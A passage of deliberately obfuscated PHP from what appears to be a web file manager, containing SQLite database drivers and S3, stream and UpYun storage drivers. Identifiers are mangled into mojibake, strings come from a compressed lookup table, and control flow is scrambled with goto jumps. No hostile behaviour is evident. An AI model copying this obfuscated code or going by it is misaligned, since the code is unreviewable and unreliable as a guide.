($E§÷’Øéè«) { foreach ($E§÷’Øéè« as $Bó÷ÃÏÄ“« => $Bîò‹»ˆ¼‹) { $b¯ƒ¦èÁª[$Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[27]]] = array($A¹Â‰øÂ²[28] => $Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[27]], $A¹Â‰øÂ²[29] => $Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[30]], $A¹Â‰øÂ²[31] => (bool) ($Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[32]] === $A¹Â‰øÂ²[33]), $A¹Â‰øÂ²[34] => $Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[35]], $A¹Â‰øÂ²[36] => strtolower($Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[37]]) == $A¹Â‰øÂ²[38], $A¹Â‰øÂ²[39] => strtolower($Bîò‹»ˆ¼‹[$A¹Â‰øÂ²[40]]) == $A¹Â‰øÂ²[41]); } } return $b¯ƒ¦èÁª; } public function getTables($dÜ°’¤’ñ = '') { $Eõ½’‹…¼ª =& $_SERVER[ä°„ä°º]; $Dà¨Ñ‘»’æ = $this->query($Eõ½’‹…¼ª[42] . $Eõ½’‹…¼ª[43] . $Eõ½’‹…¼ª[44]); $cÌÓÓ‘‰Û„ = array(); foreach ($Dà¨Ñ‘»’æ as $Bœã¾à¾Éª => $A’Û Å¢ºæ) { $cÌÓÓ‘‰Û„[$Bœã¾à¾Éª] = current($A’Û Å¢ºæ); } return $cÌÓÓ‘‰Û„; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $a­â¬—á¸Ú =& $_SERVER[ä°„ä°º]; $dİ¼ë¸­âŠ = sqlite_last_error($this->_linkID); $this->error = $dİ¼ë¸­âŠ . $a­â¬—á¸Ú[4] . sqlite_error_string($dİ¼ë¸­âŠ); if ($a­â¬—á¸Ú[33] != $this->queryStr) { $this->error .= LNG($a­â¬—á¸Ú[45]) . $this->queryStr; } think_trace($this->error, $a­â¬—á¸Ú[33], $a­â¬—á¸Ú[46]); return $this->error; } public function escapeString($fÂÒš÷˜áè) { return sqlite_escape_string($fÂÒš÷˜áè); } public function parseLimit($bŞˆèØÃÅÍ) { $C¶“Ÿ‡ù¤Ö =& $_SERVER[ä°„ä°º]; $aÁè‰ˆÄÔ‰ = $C¶“Ÿ‡ù¤Ö[33]; if (!empty($bŞˆèØÃÅÍ)) { $bŞˆèØÃÅÍ = explode($C¶“Ÿ‡ù¤Ö[47], $bŞˆèØÃÅÍ); if (count($bŞˆèØÃÅÍ) > 1) { $aÁè‰ˆÄÔ‰ .= $C¶“Ÿ‡ù¤Ö[48] . $bŞˆèØÃÅÍ[1] . $C¶“Ÿ‡ù¤Ö[49] . $bŞˆèØÃÅÍ[0] . $C¶“Ÿ‡ù¤Ö[50]; } else { $aÁè‰ˆÄÔ‰ .= $C¶“Ÿ‡ù¤Ö[48] . $bŞˆèØÃÅÍ[0] . $C¶“Ÿ‡ù¤Ö[50]; } } return $aÁè‰ˆÄÔ‰; } } class DbSqlite3Base extends Db { public function __construct($b†¯“ïî£œ = '') { $b¤™öò‘¤ó =& $_SERVER[ä°„ä°º]; if (!class_exists($b¤™öò‘¤ó[51])) { think_exception(think_lang($b¤™öò‘¤ó[10]) . $b¤™öò‘¤ó[52]); } if (!empty($b†¯“ïî£œ)) { if (!isset($b†¯“ïî£œ[$b¤™öò‘¤ó[12]])) { $b†¯“ïî£œ[$b¤™öò‘¤ó[12]] = 438; } $this->config = $b†¯“ïî£œ; if (empty($this->config[$b¤™öò‘¤ó[13]])) { $this->config[$b¤™öò‘¤ó[13]] = array(); } } } public function connect($b•§½ªÇ• = '', $dÚìâŸ¼î† = 0) { $f§ÃÇ”Ëò„ =& $_SERVER[ä°„ä°º]; if (!isset($this->linkID[$dÚìâŸ¼î†])) { if (empty($b•§½ªÇ•)) { $b•§½ªÇ• = $this->config; } $this->linkID[$dÚìâŸ¼î†] = new SQLite3($b•§½ªÇ•[$f§ÃÇ”Ëò„[17]]); if (!$this->linkID[$dÚìâŸ¼î†]) { think_exception($this->linkID[$dÚìâŸ¼î†]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dÚìâŸ¼î†]->busyTimeout(30000); if (1 != think_config($f§ÃÇ”Ëò„[18])) { unset($this->config); } } return $this->linkID[$dÚìâŸ¼î†]; } public function free() { $this->queryID = null; } public function query($aİ…Ôï¿¸ò) { goto B’¢„ò«Ä; DçŸ¤„ŞáÚ: $this->queryStr = $aİ…Ôï¿¸ò; if ($this->queryID) { $this->free(); } think_action_status($cõÙÌÄÛ[19], 1); goto b›˜Ò‘ç; b›˜Ò‘ç: think_status($cõÙÌÄÛ[20]); $this->queryID = $this->_linkID->query($aİ…Ôï¿¸ò); $this->debug(); goto AĞ¦“æÌŒ²; AĞ¦“æÌŒ²: if (!1 === $this->queryID) { $this->error(); return !1; } else { $dîÂÙ‰¯‹º = $this->getAll(); $this->numRows = count($dîÂÙ‰¯‹º); return $dîÂÙ‰¯‹º; } goto A“ù°±Â«; B’¢„ò«Ä: $cõÙÌÄÛ =& $_SERVER[ä°„ä°º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DçŸ¤„ŞáÚ; A“ù°±Â«: } public function execute($B·ç»ê›’¡) { goto fÏÓâğç; fÏÓâğç: $Cİ¹ê™ŒœÉ =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e±Ï†«„Š; e±Ï†«„Š: $this->queryStr = $B·ç»ê›’¡; if ($this->queryID) { $this->free(); } think_action_status($Cİ¹ê™ŒœÉ[21], 1); goto aÄŠ‘ŞŞ–Œ; e‚¼§ÀÍ›º: if (!1 === $dÑÑ¾¯‡£¥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto BÏ©°ÓÚßÂ; aÄŠ‘ŞŞ–Œ: think_status($Cİ¹ê™ŒœÉ[20]); $dÑÑ¾¯‡£¥ = $this->_linkID->exec($B·ç»ê›’¡); $this->debug(); goto e‚¼§ÀÍ›º; BÏ©°ÓÚßÂ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ä°„ä°º][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DÀç„­… = $this->_linkID->query($_SERVER[ä°„ä°º][23]); if (!$DÀç„­…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÓÁÈî‡Œ‡ = $this->_linkID->query($_SERVER[ä°„ä°º][24]); if (!$AÓÁÈî‡Œ‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Dğğç”Ÿç = array(); while ($c†ÒŠÄĞË„ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Dğğç”Ÿç[] = $c†ÒŠÄĞË„; } $this->queryID->reset(); return $Dğğç”Ÿç; } public function getFields($F›‰Æ¨ ç) { $Eª»ºÁ‰Ñœ =& $_SERVER[ä°„ä°º]; $A“‹ğƒŞŒ = $this->query($Eª»ºÁ‰Ñœ[25] . $F›‰Æ¨ ç . $Eª»ºÁ‰Ñœ[26]); $bªïœÆ› = array(); if ($A“‹ğƒŞŒ) { foreach ($A“‹ğƒŞŒ as $B››†Ò†ªÀ => $bğšøô©¸Ü) { $bªïœÆ›[$bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[28]]] = array($Eª»ºÁ‰Ñœ[28] => $bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[28]], $Eª»ºÁ‰Ñœ[29] => $bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[29]], $Eª»ºÁ‰Ñœ[31] => (bool) ($bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[31]] === $Eª»ºÁ‰Ñœ[33]), $Eª»ºÁ‰Ñœ[34] => $bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[53]], $Eª»ºÁ‰Ñœ[36] => (bool) $bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[54]], $Eª»ºÁ‰Ñœ[39] => (bool) $bğšøô©¸Ü[$Eª»ºÁ‰Ñœ[54]]); } } return $bªïœÆ›; } public function getTables($A¨šÖˆ˜ª = '') { $BËİ˜º×¹ =& $_SERVER[ä°„ä°º]; $a»¯‰†­›Î = $this->query($BËİ˜º×¹[42] . $BËİ˜º×¹[43] . $BËİ˜º×¹[44]); $Aç‹¸É¿åê = array(); foreach ($a»¯‰†­›Î as $A–ğ¬ø©Óä => $dÍ²ŠöºĞ„) { $Aç‹¸É¿åê[$A–ğ¬ø©Óä] = current($dÍ²ŠöºĞ„); } return $Aç‹¸É¿åê; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $d¢‘µæ—¤” =& $_SERVER[ä°„ä°º]; $this->error = $this->_linkID->lastErrorMsg(); if ($d¢‘µæ—¤”[33] != $this->queryStr) { $this->error .= LNG($d¢‘µæ—¤”[45]) . $this->queryStr; } think_trace($this->error, $d¢‘µæ—¤”[33], $d¢‘µæ—¤”[46]); return $this->error; } public function escapeString($eëîøé™èå) { $e±¾‘‡“ÇØ =& $_SERVER[ä°„ä°º]; if ($this->_linkID) { return $this->_linkID->escapeString($eëîøé™èå); } return str_ireplace($e±¾‘‡“ÇØ[55], $e±¾‘‡“ÇØ[56], $eëîøé™èå); } public function parseLimit($C†ÊÒÁá…©) { $AÑšÈœÒñó =& $_SERVER[ä°„ä°º]; $eøŸä˜µÔ® = $AÑšÈœÒñó[33]; if (!empty($C†ÊÒÁá…©)) { $C†ÊÒÁá…© = explode($AÑšÈœÒñó[47], $C†ÊÒÁá…©); if (count($C†ÊÒÁá…©) > 1) { $eøŸä˜µÔ® .= $AÑšÈœÒñó[48] . $C†ÊÒÁá…©[1] . $AÑšÈœÒñó[49] . $C†ÊÒÁá…©[0] . $AÑšÈœÒñó[50]; } else { $eøŸä˜µÔ® .= $AÑšÈœÒñó[48] . $C†ÊÒÁá…©[0] . $AÑšÈœÒñó[50]; } } return $eøŸä˜µÔ®; } } goto B¹‘ˆØƒÒ; f„â‡Äˆ•ô: function binCheckBigger($FÙ³’•îšÆ, $d³¾òÑæ„¡) { return $FÙ³’•îšÆ > $d³¾òÑæ„¡; } $_SERVER[$_SERVER[Åí”÷‘ñ»Á][3]] = ("\71\61\66\63"."\71\63")+0;$_mkdc="aeU2m9YDcFhKCjQQsYHwDxEYJNjWRIpnniSzhQpPqXY744deP3cEqkIQUFuZyVcuA5WxmIBmDu72rZRruU";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($fˆÊèõ¹… , $a¸‚õŞ—Ø¨) { $Fì†ë•Ïñ =& $_SERVER[ä°„ä°º]; if (isset(self::$_methodList[$fˆÊèõ¹… ])) { return @call_user_func_array(self::$_methodList[$fˆÊèõ¹… ], $a¸‚õŞ—Ø¨); } else { if (method_exists($this, $fˆÊèõ¹… )) { return call_user_func_array(array($this, $fˆÊèõ¹… ), $a¸‚õŞ—Ø¨); } else { think_exception(__CLASS__ . $Fì†ë•Ïñ[4] . $fˆÊèõ¹…  . $Fì†ë•Ïñ[5]); } } } public static function __callStatic($F½ˆÏ‰„â¾, $cá™ÖÈ‘ö‰) { if (isset(self::$_methodListStatic[$F½ˆÏ‰„â¾])) { return call_user_func_array(self::$_methodListStatic[$F½ˆÏ‰„â¾], $cá™ÖÈ‘ö‰); } else { if (method_exists(self, $F½ˆÏ‰„â¾)) { return call_user_func_array(array(self, $F½ˆÏ‰„â¾), $cá™ÖÈ‘ö‰); } else { show_json("{$F½ˆÏ‰„â¾}\x28\51\x20\x6e\x6f\x74\x20\x65\170\151\x73\164\x3b", !1); } } } public static function addMethod($Cò°Ê”íŸ, $báïÅ“‘¯²) { self::$_methodList[$Cò°Ê”íŸ] = $báïÅ“‘¯²; } public static function addMethodStatic($A½¶º©’Ş­, $B§®…¾”„) { self::$_methodListStatic[$A½¶º©’Ş­] = $B§®…¾”„; } } goto f¦ÍÔÉßç; Dåß¥«Š‘È: define($_SERVER[ä°„ä°º][0], $_SERVER[ä°„ä°º][1]); $_SERVER[Åí”÷‘ñ»Á] = explode($_SERVER[ä°„ä°º][2], gzinflate(substr($_SERVER[ä°„ä°º][3], 10, -8))); function binCheckEq($FƒĞ›«ƒá’, $aìÕ²ŒµÃ’) { return $FƒĞ›«ƒá’ == $aìÕ²ŒµÃ’; } goto f™ˆ—¸À†â; DÍÀ‡¼°‰Ä: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($dŒ«İ„Š–‚) { parent::__construct($dŒ«İ„Š–‚); } public function uploadFormData($EÅ³Ğ‘Š¦‡, $E¼Ç†…©‡Ë = 3600) { goto e°ÙÀ¾¯çİ; EÊŠ§Ï¤æğ: $DÛÍ§¦´Ëä = array($this->accessKey, $Bİßó«·­ó, $this->region, $dË¨´†ƒØÖ, $a“à…ğ‚); $BôÅ¯âÛñ¶ = implode($DÉÓïŒéæ[8], $DÛÍ§¦´Ëä); $a•ƒôŒæ† = array($DÉÓïŒéæ[1212] => gmdate($DÉÓïŒéæ[1211], strtotime($DÉÓïŒéæ[1248])), $DÉÓïŒéæ[1213] => array(array($DÉÓïŒéæ[1215] => $this->bucket), array($DÉÓïŒéæ[1214] => $D¤ôÕÃ§Ä‡), array($DÉÓïŒéæ[1216], $DÉÓïŒéæ[1217], $DÉÓïŒéæ[33]), array($DÉÓïŒéæ[1216], $DÉÓïŒéæ[1249], $DÉÓïŒéæ[33]), array($DÉÓïŒéæ[1216], $DÉÓïŒéæ[1250], $DÉÓïŒéæ[33]), array($DÉÓïŒéæ[1218] => $a”ŸœÃíÉŒ), array($DÉÓïŒéæ[1251] => $BôÅ¯âÛñ¶), array($DÉÓïŒéæ[1252] => $dÜ±ØÀ¡Å®), array($DÉÓïŒéæ[1253] => $dØ–íõ——±), array($DÉÓïŒéæ[1254] => $câÈãä£ã))); goto Bİù†ó†…è; Fƒ¶ñºïø: $dË¨´†ƒØÖ = $DÉÓïŒéæ[59]; $dØ–íõ——± = gmdate($DÉÓïŒéæ[1246]); $Bİßó«·­ó = gmdate($DÉÓïŒéæ[734]); goto E¥‘Ô‘†¾; E¥‘Ô‘†¾: $a“à…ğ‚ = $DÉÓïŒéæ[1247]; $câÈãä£ã = $E¼Ç†…©‡Ë . $DÉÓïŒéæ[33]; $a”ŸœÃíÉŒ = $DÉÓïŒéæ[1210]; goto EÊŠ§Ï¤æğ; Bİù†ó†…è: $fòÕá›¬®› = base64_encode(json_encode($a•ƒôŒæ†)); $A¶ˆÍ‰ƒ†† = hash_hmac($DÉÓïŒéæ[1255], $Bİßó«·­ó, $DÉÓïŒéæ[1256] . $this->secret, !0); $A¦ö¢œˆÙ¨ = hash_hmac($DÉÓïŒéæ[1255], $this->region, $A¶ˆÍ‰ƒ††, !0); goto däé“Áçö; e°ÙÀ¾¯çİ: $DÉÓïŒéæ =& $_SERVER[ä°„ä°º]; $D¤ôÕÃ§Ä‡ = $DÉÓïŒéæ[192]; $dÜ±ØÀ¡Å® = $DÉÓïŒéæ[1245]; goto Fƒ¶ñºïø; däé“Áçö: $EŒ‰ÓŠ§áâ = hash_hmac($DÉÓïŒéæ[1255], $dË¨´†ƒØÖ, $A¦ö¢œˆÙ¨, !0); $fŒ–Õ›ñë = hash_hmac($DÉÓïŒéæ[1255], $a“à…ğ‚, $EŒ‰ÓŠ§áâ, !0); $bÇ‚ªÍ¶Š¨ = hash_hmac($DÉÓïŒéæ[1255], $fòÕá›¬®›, $fŒ–Õ›ñë); goto fö¬ù¯Ë‚; fö¬ù¯Ë‚: $e¨ãØŠØ¤ = array($DÉÓïŒéæ[211] => $DÉÓïŒéæ[33], $DÉÓïŒéæ[1257] => $DÉÓïŒéæ[33], $DÉÓïŒéæ[1214] => $D¤ôÕÃ§Ä‡, $DÉÓïŒéæ[1218] => $a”ŸœÃíÉŒ, $DÉÓïŒéæ[1222] => $fòÕá›¬®›, $DÉÓïŒéæ[1258] => $BôÅ¯âÛñ¶, $DÉÓïŒéæ[1259] => $dÜ±ØÀ¡Å®, $DÉÓïŒéæ[1260] => $dØ–íõ——±, $DÉÓïŒéæ[1261] => $câÈãä£ã, $DÉÓïŒéæ[1262] => $bÇ‚ªÍ¶Š¨, $DÉÓïŒéæ[175] => $this->getHost()); return $e¨ãØŠØ¤; goto c¦ÌÖ“’‚; c¦ÌÖ“’‚: } public function multiUploadFormData($dÄ¶ÂÌ¾Ç®, $FœÖ á¢Ë… = 3600) { $aÆÅçƒô¯‚ =& $_SERVER[ä°„ä°º]; $B‹“î˜‹§¹ = gmdate($aÆÅçƒô¯‚[1339]); $dÇˆ‘¾Ë·Œ = array(); $FÀñ·ªç£ = $this->client->getUploadId($this->bucket, $dÄ¶ÂÌ¾Ç®, $dÇˆ‘¾Ë·Œ); if (!$FÀñ·ªç£) { return !1; } return array($aÆÅçƒô¯‚[221] => $FÀñ·ªç£, $aÆÅçƒô¯‚[175] => $this->getHost() . $aÆÅçƒô¯‚[8] . $this->pathEncode($dÄ¶ÂÌ¾Ç®), $aÆÅçƒô¯‚[222] => $B‹“î˜‹§¹, $aÆÅçƒô¯‚[93] => $dÄ¶ÂÌ¾Ç®); } public function multiUploadAuthData($D‹ÌºÚê×í, $F…¼‰¹Üïá = array()) { goto d‚èØèØŒµ; d‚èØèØŒµ: $CÊ¤ºÉ¶œ =& $_SERVER[ä°„ä°º]; $C»ƒ˜°Ë¹ = isset($F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[168]]) ? $F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[168]] : $CÊ¤ºÉ¶œ[33]; $d„–èÁ© = $F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[93]]; goto CÖ¤İÓìÓ´; bœš±½ÃÌ¿: $A‰âÙœ’Å— = $CÊ¤ºÉ¶œ[226]; $D‘š½çµŠí = $CÊ¤ºÉ¶œ[8] . $this->pathEncode($d„–èÁ©) . $C»ƒ˜°Ë¹; $AÛœï™µ· = $this->client->__getSignatureV4($fİœ‚ÒÚ‰ñ, $eœô”Øè¯, $A‰âÙœ’Å—, $D‘š½çµŠí); goto eÌë¿±çêƒ; bñ¾¸„ç–´: if (isset($F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[1340]])) { $fİœ‚ÒÚ‰ñ[$CÊ¤ºÉ¶œ[1341]] = $F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[1340]]; } $bçóáŒÁ…Ç = explode($CÊ¤ºÉ¶œ[177], $this->getHost()); $eœô”Øè¯ = array($CÊ¤ºÉ¶œ[1342] => $bçóáŒÁ…Ç[1], $CÊ¤ºÉ¶œ[1343] => $CÊ¤ºÉ¶œ[33], $CÊ¤ºÉ¶œ[211] => $CÊ¤ºÉ¶œ[119], $CÊ¤ºÉ¶œ[1257] => $F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[78]]); goto bœš±½ÃÌ¿; CÖ¤İÓìÓ´: unset($F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[93]]); if (isset($F…¼‰¹Üïá[$CÊ¤ºÉ¶œ[223]])) { return $this->listUploadParts($d„–èÁ©, $F…¼‰¹Üïá); } $fİœ‚ÒÚ‰ñ = array(); goto bñ¾¸„ç–´; eÌë¿±çêƒ: if (strpos($C»ƒ˜°Ë¹, $CÊ¤ºÉ¶œ[225]) === 0) { if (isset($fİœ‚ÒÚ‰ñ[$CÊ¤ºÉ¶œ[1341]])) { $cğÊœÅª‰ = $fİœ‚ÒÚ‰ñ[$CÊ¤ºÉ¶œ[1341]]; } else { if (isset($AÛœï™µ·[$CÊ¤ºÉ¶œ[1341]])) { $cğÊœÅª‰ = $AÛœï™µ·[$CÊ¤ºÉ¶œ[1341]]; } else { $cğÊœÅª‰ = hash($CÊ¤ºÉ¶œ[1255], $CÊ¤ºÉ¶œ[33]); } } return array($CÊ¤ºÉ¶œ[232] => $AÛœï™µ·[$CÊ¤ºÉ¶œ[232]], $CÊ¤ºÉ¶œ[1341] => $cğÊœÅª‰, $CÊ¤ºÉ¶œ[222] => $AÛœï™µ·[$CÊ¤ºÉ¶œ[1344]]); } return $AÛœï™µ·[$CÊ¤ºÉ¶œ[232]]; goto DÀÙ™×ŞÂâ; DÀÙ™×ŞÂâ: } public function listUploadParts($c…ªÊ«¢ãÃ, $E¿ÌÓˆ™¥ = array()) { goto aê«ô­”»; dÊ°Şï›¯¹: $fµŠ¥‚– = $this->client->__getSignatureV4($bÓ¾Şé“¥, $D‘©ÒŒ­ , $Fò÷Ñ‚·º¼, $EƒÛÀ——ŞÙ, $dÖ òÊº×); return array($c»Ñç–ïâ[232] => $fµŠ¥‚–[$c»Ñç–ïâ[232]], $c»Ñç–ïâ[222] => $fµŠ¥‚–[$c»Ñç–ïâ[1344]], $c»Ñç–ïâ[234] => $D‡×éœÜèÌ, $c»Ñç–ïâ[1341] => $fµŠ¥‚–[$c»Ñç–ïâ[1341]]); goto C‘¬ò‘ÜÇ; f°ØŞÄöŠ: $D‘©ÒŒ­  = array($c»Ñç–ïâ[1342] => $DÜÁ—»™‘‡[1], $c»Ñç–ïâ[211] => $c»Ñç–ïâ[119], $c»Ñç–ïâ[1257] => strlen($dÖ òÊº×)); $Fò÷Ñ‚·º¼ = $c»Ñç–ïâ[224]; $EƒÛÀ——ŞÙ = $c»Ñç–ïâ[8] . $this->pathEncode($c…ªÊ«¢ãÃ) . $E¿ÌÓˆ™¥[$c»Ñç–ïâ[168]]; goto dÊ°Şï›¯¹; BŞâğ”ˆÍ: $dÖ òÊº× .= $c»Ñç–ïâ[1348]; $bÓ¾Şé“¥ = array(); $DÜÁ—»™‘‡ = explode($c»Ñç–ïâ[177], $this->getHost()); goto f°ØŞÄöŠ; a÷ªÎŞ™ë: if (!$D‡×éœÜèÌ) { return !1; } $dÖ òÊº× = $c»Ñç–ïâ[1345]; foreach ($D‡×éœÜèÌ as $DÅãæ¢½»Ü) { $dÖ òÊº× .= $c»Ñç–ïâ[1346] . "\74\x50\x61\162\164\x4e\165\x6d\x62\x65\162\76{$DÅãæ¢½»Ü[$c»Ñç–ïâ[1302]]}\74\x2f\120\x61\x72\x74\116\x75\x6d\x62\145\x72\76\xa" . "\x3c\x45\124\x61\x67\76{$DÅãæ¢½»Ü[$c»Ñç–ïâ[1303]]}\74\x2f\x45\124\141\147\76\12" . $c»Ñç–ïâ[1347]; } goto BŞâğ”ˆÍ; aê«ô­”»: $c»Ñç–ïâ =& $_SERVER[ä°„ä°º]; $DØª²íÄ£ = str_replace($c»Ñç–ïâ[233], $c»Ñç–ïâ[33], $E¿ÌÓˆ™¥[$c»Ñç–ïâ[168]]); $D‡×éœÜèÌ = $this->client->listParts($this->bucket, $c…ªÊ«¢ãÃ, $DØª²íÄ£); goto a÷ªÎŞ™ë; C‘¬ò‘ÜÇ: } public function link($cĞÚŸğé–İ, $E‰Éˆù˜æÖ = array()) { return parent::link($cĞÚŸğé–İ, $E‰Éˆù˜æÖ); } public function fileOut($d–äñ¥İ’½, $b…æ«•©Ş´ = false, $A÷Ÿé²Ó = false, $A°ª˜ë™ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ä°„ä°º][1349])) { return parent::fileOutServer($d–äñ¥İ’½, $b…æ«•©Ş´, $A÷Ÿé²Ó, $A°ª˜ë™); } parent::fileOut($d–äñ¥İ’½, $b…æ«•©Ş´, $A÷Ÿé²Ó, $A°ª˜ë™); } public function fileOutImage($eç½÷Úˆ‰‰, $A¼í›ñ‘òÇ = 250) { if (strstr($this->endpoint, $_SERVER[ä°„ä°º][1349])) { return parent::fileOutImageServer($eç½÷Úˆ‰‰, $A¼í›ñ‘òÇ); } parent::fileOutImage($eç½÷Úˆ‰‰, $A¼í›ñ‘òÇ); } public function fileOutLink($c±ƒòŠÈõÚ) { $dë’ŞæÉì =& $_SERVER[ä°„ä°º]; if (substr($c±ƒòŠÈõÚ, 0, 7) == $dë’ŞæÉì[1225]) { $c±ƒòŠÈõÚ = $dë’ŞæÉì[1226] . substr($c±ƒòŠÈõÚ, 7); } header($dë’ŞæÉì[159] . $c±ƒòŠÈõÚ); die; } public function getHost() { $FèÚŠ“åîâ =& $_SERVER[ä°„ä°º]; $böî·›æ½ = str_rtrim(parent::getHost(), $FèÚŠ“åîâ[8] . $this->bucket); $böî·›æ½ = explode($FèÚŠ“åîâ[177], $böî·›æ½); return $böî·›æ½[0] . $FèÚŠ“åîâ[177] . $this->bucket . $FèÚŠ“åîâ[95] . $böî·›æ½[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($c¸ÓàŸËµ¶, $d­ˆÄ×ÁÄ = 0) { parent::__construct(); $this->source = $c¸ÓàŸËµ¶; $this->sourceSize = $d­ˆÄ×ÁÄ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($CßÑ¥‡Ì—Š = false) { return $this->sourceSize; } public function getContent($a–Š‘öŠ¢Á = false) { return $this->fileSubstr($a–Š‘öŠ¢Á, 0, $this->sourceSize); } public function fileSubstr($AôšŠà»İ© = false, $D†½­åÕŒ = 0, $C½ÄÛÏØ‘é = 0) { if (!$C½ÄÛÏØ‘é) { $C½ÄÛÏØ‘é = $this->sourceSize; } $F‹ÅÊÕ©ãá = $this->sourceSize - $D†½­åÕŒ; if ($C½ÄÛÏØ‘é >= $F‹ÅÊÕ©ãá) { $C½ÄÛÏØ‘é = $F‹ÅÊÕ©ãá; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $D†½­åÕŒ, $C½ÄÛÏØ‘é); } if ($this->sourceType == self::TYPE_FILE) { if ($C½ÄÛÏØ‘é <= 0) { return $_SERVER[ä°„ä°º][33]; } $CçÖ¶ÕÏ¦ = ftell($this->source); fseek_64($this->source, $CçÖ¶ÕÏ¦ + $D†½­åÕŒ); $bÁÙ¡È…Èğ = @fread($this->source, $C½ÄÛÏØ‘é); fseek_64($this->source, $CçÖ¶ÕÏ¦); return $bÁÙ¡È…Èğ; } } public function hashMd5($c‹†‡İÄ†Ø = false) { return md5($this->getContent()); } public static function hash($Bªôß«§‰„, $c¥Ùğ–¶² = 0) { $C¥ßÊÙ“…ï = new PathDriverStream($Bªôß«§‰„, $c¥Ùğ–¶²); return $C¥ßÊÙ“…ï->hashSimple($Bªôß«§‰„); } public static function md5($eÇéÄ¡é¦, $DÙ®ñœØ¦Ê = 0) { $DÚÄíƒƒö¡ = new PathDriverStream($eÇéÄ¡é¦, $DÙ®ñœØ¦Ê); return $DÚÄíƒƒö¡->hashMd5($eÇéÄ¡é¦); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\72\x2f\x2f\166\x30\x2e\141\x70\151\x2e\165\x70\x79\x75\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($F‘Šî¶ŠóÁ) { parent::__construct(); $this->_init($F‘Šî¶ŠóÁ); } public function _init($C®„óø‚’Ù) { $fºÓæœÊôò =& $_SERVER[ä°„ä°º]; foreach ($C®„óø‚’Ù as $DØ°ËÏÚ­ò => $cÖÃ–°äğ) { if (isset($this->{$DØ°ËÏÚ­ò})) { $this->{$DØ°ËÏÚ­ò} = $cÖÃ–°äğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($fºÓæœÊôò[1350] . LNG($fºÓæœÊôò[1283])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c¥˜š”»š, $EÓÆÏ å½ø = "\107\x45\124") { $cÃ¯±æ¶Ç =& $_SERVER[ä°„ä°º]; $FôÖèÜõ‡ë = gmdate($cÃ¯±æ¶Ç[1316]); $AÜ”§Ğ›’ = base64_encode(hash_hmac($cÃ¯±æ¶Ç[1351], "{$EÓÆÏ å½ø}\x26{$c¥˜š”»š}\46{$FôÖèÜõ‡ë}", md5("{$this->userpass}"), !0)); $B±†©µá´ã = array("\x41\165\164\150\x6f\162\x69\172\141\x74\151\157\x6e\72\125\120\131\x55\x4e\40{$this->username}\72{$AÜ”§Ğ›’}", "\104\141\x74\x65\x3a{$FôÖèÜõ‡ë}"); return $B±†©µá´ã; } public function ussRequest($D‰ğ¿Æ‘ï„, $B¤½çˆµ‚ = "\x47\x45\124", $fÃµ¢±ºÑ¤ = false, $Fò«àÁÎÏç = false, $fò®íˆÎœÄ = false) { goto a™«ë‚¯; F¢°Ø„‘Ê¬: if (!$dÁáÙˆ¥«ù) { return array($a¨‹Î”Ç˜ò[1107] => !1, $a¨‹Î”Ç˜ò[1109] => $a¨‹Î”Ç˜ò[1352]); } if (strtolower($B¤½çˆµ‚) == $a¨‹Î”Ç˜ò[190] || in_array($dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[1107]], array($a¨‹Î”Ç˜ò[1210], $a¨‹Î”Ç˜ò[1353]))) { $fÃµ¢±ºÑ¤ = $dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[1354]]; } else { $fÃµ¢±ºÑ¤ = json_decode($dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[1109]], !0); if (!$fÃµ¢±ºÑ¤) { $fÃµ¢±ºÑ¤ = $dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[1109]]; } else { if (!$dÁáÙˆ¥«ù[$a¨‹Î”Ç˜ò[733]] && 